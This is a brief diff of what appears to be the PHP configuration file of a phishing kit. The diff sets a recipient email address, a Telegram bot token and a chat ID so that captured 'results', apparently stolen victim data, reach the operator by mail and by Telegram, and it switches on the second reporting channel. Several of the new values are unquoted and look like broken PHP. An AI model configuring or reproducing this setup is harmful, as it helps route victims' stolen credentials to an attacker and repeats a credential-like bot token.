@@ -2,23 +2,23 @@
 
 
 /* 📧 Set Your Email Address to Receive Results in Your Inbox */
-$Your_Mail = "elisabethwolf@yandex.com";
+$Your_Mail = "danyellekurtz.conway@outlook.com";
 /* --------------------------  */
 
 
 /* 🤖 Telegram Bot Setup 🤖 */
 
 // 🗝️ Enter your bot's token
-$botToken = "YOUR_BOT_TOKEN";
+$botToken = 7558491921:AAHUTukOw29luISZHlTCiEUrPaqcQEwjrAg;
 
 // 💬 Enter your chat ID
-$chatId = "YOUR_CHAT_ID";
+$chatId = 7296145278;
 
 /* --------------------------------------------------- */
 
 /* If you want two to see the result, If you want to stop , change To off  :)  */
-$botToken_0="off"; 
-$chatId_0="off";  
+$botToken_0= on; 
+$chatId_0= on;  
 /* --------------------------  */
 
 
